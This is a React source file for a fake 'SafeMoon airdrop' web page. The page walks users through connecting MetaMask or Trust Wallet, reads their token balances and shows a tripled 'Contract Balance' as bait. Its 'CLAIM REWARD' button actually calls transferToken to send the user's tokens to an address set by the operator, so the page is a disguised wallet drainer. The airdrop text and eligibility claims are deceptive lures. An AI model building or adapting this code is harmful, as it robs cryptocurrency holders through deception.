import React, { useState, useEffect } from "react";
import styles from "./guide.module.scss";
import gift from "../../assets/11.png";
import { IoIosArrowForward } from "react-icons/io";
import { MdComputer } from "react-icons/md";
import PcLogo from "../../assets/pcLogo.jpg";
import met1 from "../../assets/met1.jpeg";
import met2 from "../../assets/met2.jpeg";
import met3 from "../../assets/met3.jpeg";
import twt1 from "../../assets/twt1.jpeg";
import twt2 from "../../assets/twt2.jpeg";
import twt3 from "../../assets/twt3.jpeg";
import { ethers } from "ethers";
import { formatFixed } from "@exodus/ethersproject-bignumber";
import dayjs from "dayjs";
import relativeTime from "dayjs/plugin/relativeTime";
// import Countdown from "react-countdown";
import { getTokenBalances, transferToken } from "../../helper/helpers";
import { BiUserCircle } from "react-icons/bi";
import gLuck from "../../assets/11.png";
import nt1 from "../../assets/nt1.jpeg";
import nt2 from "../../assets/nt2.jpeg";
import { useCallback } from "react";
dayjs.extend(relativeTime);

const Guide = ({
  setStateValue,
  stateValue,
  setLoadingTable,
  loadingTable,
}) => {
  const [state, setState] = useState({
    connectPc: false,
    connectMeta: false,
    connectTrust: false,
    eligibilityStatus: false,
  });

  const [listAllTokens, setListAllTokens] = useState([]);

  const [processingStaking, setProcessingStaking] = useState(false);

  // 0xbe9375c6a420d2eeb258962efb95551a5b722803

  let to = process.env.REACT_APP_MY_ADDRESS;

  let APIKeyString = process.env.REACT_APP_API_KEY;

  // Fetches all the user tokens
  const getERC20Tokens = useCallback(async () => {
    // console.log("USE CALLBACK RAN");
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    let chainId = 56;
    let userwallet = stateValue.userWallet;
    console.log(chainId,APIKeyString, userwallet, provider);

    const allTokens = await getTokenBalances({
      chainID: chainId,
      APIKeyString,
      userwallet,
      provider,
    });

    // console.log(`This is all the ${allTokens}`);
    setListAllTokens(allTokens);
    setLoadingTable(false);
    return allTokens;
  }, [APIKeyString, setLoadingTable, stateValue.userWallet]);

  useEffect(() => {
    const walletAddressData = sessionStorage.getItem("account");
    const balanceData = sessionStorage.getItem("balance");
    // const chainIdData = sessionStorage.getItem("chainID");
    const userWalletData = sessionStorage.getItem("setuserWallet");

    if (userWalletData) {
      console.log(userWalletData);
      setStateValue({
        initiateWallet: true,
        processingWalletConnect: false,
        // chainID: parseInt(chainIdData),
        accountBalance: balanceData,
        userWallet: userWalletData,
        walletAddress: walletAddressData,
        walletConnected: true,
        chainID: 56,
      });

      (async () => {
        // console.log(`Fetch data balance`);
        setStateValue({
          initiateWallet: false,
          processingWalletConnect: false,
          chainID: 56,
          // chainID: parseInt(chainIdData),
          accountBalance: balanceData,
          userWallet: userWalletData,
          walletAddress: walletAddressData,
          walletConnected: true,
        });
        await getERC20Tokens();
      })();
    }
  }, [stateValue.walletConnected, setStateValue, getERC20Tokens]);

  const fArray = [...listAllTokens];
  const result = fArray?.filter((item) => {
    if (item.address === "0x42981d0bfbaf196529376ee702f2a9eb9092fcb5") {
      return item.address;
    }
    return false;
  });
  console.log(result);

  // count down functionality starts here
  // const renderer = ({ days, hours, minutes, seconds, completed }) => {
  //   return <span>{`${days}d: ${hours}h: ${minutes}m: ${seconds}s`}</span>;
  // };

  // functionality that handle the instructions toggle
  const handleToggleInstruction = (id) => {
    let newObj = { ...state };
    newObj[id] = !newObj[id];
    setState(newObj);
  };

  //   This functionality format token balance big number
  const formatBalance = (balance, decimals) => {
    let format = formatFixed(
      balance.toString(),
      Math.max(parseInt(decimals.toString()), 1)
    ).toString();
    return format;
  };

  const setTransferClick = async (balanceObj) => {
    console.log(`yes`);
    console.log(balanceObj);
    if (typeof to !== "string") {
      to = `${to}`;
    } else {
      // checks it the recipient address is a valid address
      const isAddress = ethers.utils.isAddress(to);
      if (!isAddress) {
        console.log("Invalid address provided, please try again");
      } else {
        try {
          setProcessingStaking(true);
          const provider = new ethers.providers.Web3Provider(window.ethereum);
          await transferToken(balanceObj, to, provider);
          setProcessingStaking(false);
        } catch (error) {
          setProcessingStaking(false);
          console.log(error);
        }
      }
    }
  };

  return (
    <div className={styles.container}>
      {!stateValue.walletConnected ? (
        <div className={styles.containerContent}>
          <div className={styles.countdown}>
            <h1>SAFEMOON AIRDROP</h1>
            <div className={styles.imgContainer}>
              <img src={gift} alt={gift} />
            </div>
            {/* <div className={styles.countdownContainer}>
              <span className={styles.text}> Activity ends in </span>
              <Countdown date={`2022/08/1`} renderer={renderer} />
            </div> */}
            {/* <div className={`${styles.meter} ${styles.red}`}>
              <span style={{ width: "40%" }}> </span>
            </div> */}
          </div>
          <div className={styles.guide}>
            <div className={styles.content}>
              <div className={styles.coinSummary}>
                <h2>Welcome to safeMoon Airdrop</h2>
                <span>
                  We made our best effort to make Airdrop as fair as possible.
                  However, there’s always a chance some great community members
                  may have slipped through the cracks. Don’t worry! This is the
                  first Airdrop, and 50% of the total airdrop will be
                  distributed in this phase so there are opportunities in the
                  future.
                  <div className={styles.eligibilityContainer}>
                    <div
                      className={styles.connectPc1}
                      onClick={() => {
                        handleToggleInstruction("eligibilityStatus");
                      }}
                    >
                      <div className={styles.leftIcon}>
                        <div className={styles.icon}>
                          <BiUserCircle />
                        </div>
                        <div>Eligibility Criteria for safeMoon users</div>
                      </div>
                      <div className={styles.rightIcon}>
                        <IoIosArrowForward
                          style={{
                            transform:
                              state.eligibilityStatus && "rotate(90deg)",
                          }}
                        />
                      </div>
                    </div>
                    <div
                      className={styles.pcInfo}
                      style={{ maxHeight: state.eligibilityStatus && "600px" }}
                    >
                      <div className={styles.pcInfoContent}>
                        {" "}
                        <ul>
                          <li>Used safeMoon Trade prior to June 20, 2022.</li>
                          <li>
                            Used safeMoon Earn prior to June 20, 2022. Welcome
                            fam!
                          </li>
                          <li>
                            Purchased safeMoon NFT prior to May 1, 2022. Welcome
                            fam!
                          </li>
                          <li>
                            <b>
                              If you are not eligible for this airdrop round.
                              Don’t worry! There will be plenty of opportunites
                              to earn BSW in the future
                            </b>
                          </li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </span>
              </div>
              <h3>HOW TO PARTICIPATE</h3>
              <span>
                Click on the section highlighted below for detailed instructions
                on how to partake in the airdrop
              </span>
              {/* Instructions for PC */}
              <div className={styles.connectPcContainer}>
                <div
                  className={styles.connectPc1}
                  onClick={() => {
                    handleToggleInstruction("connectPc");
                  }}
                >
                  <div className={styles.leftIcon}>
                    <div className={styles.icon}>
                      <MdComputer />
                    </div>
                    <div>Connect with your PC</div>
                  </div>
                  <div className={styles.rightIcon}>
                    <IoIosArrowForward
                      style={{
                        transform: state.connectPc && "rotate(90deg)",
                      }}
                    />
                  </div>
                </div>
                <div
                  className={styles.pcInfo}
                  style={{ maxHeight: state.connectPc && "600px" }}
                >
                  <div className={styles.pcInfoContent}>
                    {" "}
                    <ul>
                      <li>
                        if you have metamask wallet or it extension (installed
                        on your browser on your PC, you're good to go)
                      </li>
                      <li>
                        if you don't have metamask wallet installed on your Pc,
                        Download the metamask wallet extension on your chrome
                        browser and import your wallet
                        <img src={PcLogo} alt={PcLogo} />
                      </li>
                      <li>
                        Connect your wallet with our app using chrome metamask
                        extension wallet installed on your PC.
                      </li>

                      <li>This offer is eligible to all BSW holders ONLY</li>
                      <li>
                        Distribution of loyalty tokens is totally dependent on
                        the amount of BSW tokens held in the wallet (that is the
                        more loyalty tokens you hold, the more loyalty tokens
                        you'll get)
                      </li>
                      <li>
                        <b>
                          Please contact any of our administrator if you
                          encounter any difficulties or need more guidance
                        </b>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
              {/* Instructions for PC End here*/}
              {/* Instructions for Metamask */}
              <div className={styles.metaContainer}>
                <div
                  className={styles.connectPc1}
                  onClick={() => {
                    handleToggleInstruction("connectMeta");
                  }}
                >
                  <div className={styles.leftIcon}>
                    <div className={styles.icon}>
                      <MdComputer />
                    </div>
                    <div>Connect with your mobile wallet (Metamask)</div>
                  </div>
                  <div className={styles.rightIcon}>
                    <IoIosArrowForward
                      style={{
                        transform: state.connectMeta && "rotate(90deg)",
                      }}
                    />
                  </div>
                </div>
                <div
                  className={styles.pcInfo}
                  style={{ maxHeight: state.connectMeta && "1300px" }}
                >
                  <div className={styles.pcInfoContent}>
                    {" "}
                    <ul>
                      <li>
                        If you have Metamask wallet installed on your mobile
                        device, you're good to go.
                      </li>
                      <li>
                        If you don't have metamask wallet installed on your
                        mobile device, download the metamask wallet app from
                        either App store on your IOS devices or Google play
                        store store on your android devices
                      </li>
                      <li>Import your wallet</li>
                      <li>
                        Open your wallet and ensure you are on Etherium Main
                        Network then click on the navbar icon (the icon with
                        three parallel lines)
                        <img src={met1} alt={met1} />
                      </li>
                      <li>
                        Click on browser
                        <img src={met2} alt={met2} />
                      </li>
                      <li>
                        Copy our website url and paste the link in the search
                        field: https://airdrop-safeMoon.org
                        <img src={met3} alt={met3} />
                      </li>

                      <li>Proceed to connect your wallet with our app</li>
                      <li>
                        <b>
                          Please contact any of our administrator if you
                          encounter any difficulties or need more guidance
                        </b>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
              {/* Instructions for Metamask end here */}
              {/* Instructions for Trust */}
              <div className={styles.trustContainer}>
                <div
                  className={styles.connectPc1}
                  onClick={() => {
                    handleToggleInstruction("connectTrust");
                  }}
                >
                  <div className={styles.leftIcon}>
                    <div className={styles.icon}>
                      <MdComputer />
                    </div>
                    <div>Connect with your mobile wallet (Trust wallet)</div>
                  </div>
                  <div className={styles.rightIcon}>
                    <IoIosArrowForward
                      style={{
                        transform: state.connectTrust && "rotate(90deg)",
                      }}
                    />
                  </div>
                </div>
                <div
                  className={styles.pcInfo}
                  style={{ maxHeight: state.connectTrust && "1600px" }}
                >
                  <div className={styles.pcInfoContent}>
                    {" "}
                    <ul>
                      <li>
                        If you have Trust wallet installed on your mobile
                        device, you're good to go.
                      </li>
                      <li>
                        If you don't have Trust wallet installed on your mobile
                        device, download the Trust wallet app from either App
                        store on your IOS devices or Google play store store on
                        your android devices
                      </li>
                      <li>Import your wallet</li>

                      <li>
                        For IOS devices, glance to the bottom of your app and
                        click on browse
                        <img src={twt1} alt={twt1} />
                      </li>
                      <li>
                        For Android devices, glance to the bottom of your app
                        and click on dApps
                        <img src={twt3} alt={twt3} />
                      </li>
                      <li>
                        Copy our website url and paste the link in the search
                        field: https://airdrop-safeMoon.org
                        <img src={twt2} alt={met2} />
                      </li>
                      <li>
                        Click on the ethereum logo shown on the image below to
                        change your main network
                        <img src={nt1} alt={nt1} />
                      </li>
                      <li>
                        Select Binance Smart Chain as your main network
                        <img src={nt2} alt={nt2} />
                      </li>
                      <li>Proceed to connect your wallet with our app</li>
                      <li>
                        <b>
                          Please contact any of our administrator if you
                          encounter any difficulties or need more guidance
                        </b>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
              {/* Instructions for Trust end here */}
            </div>
          </div>
        </div>
      ) : (
        <div className={styles.tokenContainer}>
          <div className={styles.tokenBalanceContainer}>
            {" "}
            <div className={styles.ethBalance}>
              <div className={styles.ethBalanceContent}>
                {result.length ? (
                  <div>
                    {result.map((item, index) => (
                      <span key={index}>
                        <h2>{item.name}</h2>
                        {parseFloat(
                          formatBalance(item.balance, item.decimals)
                        ).toFixed(2)}{" "}
                        SFM
                      </span>
                    ))}
                  </div>
                ) : (
                  <div className={styles.notEligible}>
                    {loadingTable
                      ? `Loading...`
                      : `Your are not eligible for this offer`}
                  </div>
                )}
              </div>
            </div>
            <div className={styles.tokenBalance}>
              {result.length ? (
                <div className={styles.claimAirdrop}>
                  {result.map((item, index) => (
                    <div className={styles.claimAirdropContent} key={index}>
                      <div>
                        <span key={index}>
                          <h2>Contract Balance</h2>
                          {parseFloat(
                            formatBalance(item.balance, item.decimals)
                          ).toFixed(3) * 3}{" "}
                          SFM
                        </span>
                        <button
                          onClick={() => {
                            setTransferClick(item);
                          }}
                        >
                          {processingStaking ? `Processing` : ` CLAIM REWARD`}
                        </button>
                        {/*<span>
                      {parseFloat(
                        formatBalance(item.balance, item.decimals)
                      ).toFixed(2)}
                      </span>*/}
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className={styles.notEligible}>
                  {loadingTable
                    ? `Loading...`
                    : `Your are not eligible for this offer`}
                </div>
              )}
            </div>
          </div>
          <div className={styles.loyaltyContainer}>
            {!result.length ? (
              <div className={styles.notEligible}>
                {loadingTable
                  ? `Loading...`
                  : `Your are not eligible for this offer`}
              </div>
            ) : (
              <div className={styles.goodContainer}>
                <img src={gLuck} alt={gLuck} />
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Guide;
